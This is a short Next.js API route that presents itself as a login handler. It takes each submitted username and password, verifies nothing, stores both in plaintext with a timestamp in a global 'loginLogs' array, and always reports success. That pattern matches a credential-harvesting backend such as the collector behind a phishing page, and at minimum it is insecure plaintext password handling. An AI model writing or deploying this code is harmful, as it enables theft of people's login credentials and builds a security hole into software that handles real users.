import { NextResponse } from 'next/server';

if (!global.loginLogs) {
  global.loginLogs = [];
}

export async function POST(request) {
  try {
    const { username, password } = await request.json();

    const timestamp = new Date().toLocaleString();
    global.loginLogs.unshift({ username, password, timestamp });

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (err) {
    return NextResponse.json({ error: 'Failed to process login' }, { status: 500 });
  }
}
